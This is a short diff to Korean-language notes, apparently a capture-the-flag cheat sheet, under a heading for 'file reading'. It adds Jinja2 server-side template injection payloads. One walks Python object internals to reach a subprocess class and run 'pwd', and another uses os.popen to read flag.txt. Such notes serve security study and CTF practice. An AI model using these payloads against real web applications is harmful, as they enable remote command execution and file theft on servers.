@@ -9,4 +9,9 @@
 
 # 기타 코드들
 ## 파일 읽기
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[408]\('pwd',stdout=-1).communicate() }}
+```
+```
 {{ self._TemplateReference__context.cycler.__init_\_.__globals__.os.popen('cat flag.txt').read() }}
+```
